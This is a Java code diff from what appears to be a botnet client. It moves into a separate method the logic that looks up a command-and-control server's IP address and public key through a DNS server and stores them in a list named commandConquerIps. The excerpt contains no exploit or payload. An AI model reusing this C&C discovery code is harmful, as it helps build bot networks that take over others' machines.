@@ -277,33 +277,41 @@ public class NetworkService {
 			System.out.println("Ip tornato " + result);
 			return Boolean.TRUE;
 		} else {
-			url = url + engineBot.getUrirequest();
-			Pairs<String, String> result = new Pairs<>();
-			Pairs<IP, PublicKey> cec = new Pairs<>();
-			try {
-				result = botReq.getIpCeCFromDnsServer(url);
-				String buff = result.getValue1();
-				if (!buff.equals("")) {
-					cec.setValue1(new IP(buff));
-					cec.setValue2(pki.rebuildPuK(result.getValue2()));
-					
-					while(commandConquerIps.getSize()>0)
-						commandConquerIps.remove(0);
-					commandConquerIps.add(cec);
-					
-					for (int i = 0; i < commandConquerIps.getSize(); i++) {
-						Pairs<IP, PublicKey> command = commandConquerIps.get(i);
-						System.out.println("Cec: " + command.getValue1());
-					}
-					System.out.println("Connessione con DNS server OK");
-					return Boolean.TRUE;
-				} else
-					System.out.println("DNS empty");
-			} catch (Exception ex) {
-				System.err.println("Errore durante la richiesta di IP\n" + ex);
-			}
+			return getDnsCeC();
 		}
-		return Boolean.FALSE;
+	}
+
+	/**
+	 * @param url
+	 */
+	public Boolean getDnsCeC() {
+		String url = resolveDns(engineBot.getDnsurl());
+		url = url + engineBot.getUrirequest();
+		Pairs<String, String> result = new Pairs<>();
+		Pairs<IP, PublicKey> cec = new Pairs<>();
+		try {
+			result = botReq.getIpCeCFromDnsServer(url);
+			String buff = result.getValue1();
+			if (!buff.equals("")) {
+				cec.setValue1(new IP(buff));
+				cec.setValue2(pki.rebuildPuK(result.getValue2()));
+				
+				while(commandConquerIps.getSize()>0)
+					commandConquerIps.remove(0);
+				commandConquerIps.add(cec);
+				
+				for (int i = 0; i < commandConquerIps.getSize(); i++) {
+					Pairs<IP, PublicKey> command = commandConquerIps.get(i);
+					System.out.println("Cec: " + command.getValue1());
+				}
+				System.out.println("Connessione con DNS server OK");
+				return Boolean.TRUE;
+			} else
+				System.out.println("DNS empty");
+		} catch (Exception ex) {
+			System.err.println("Errore durante la richiesta di IP\n" + ex);
+		}
+		return false;
 	}
 
 	/**
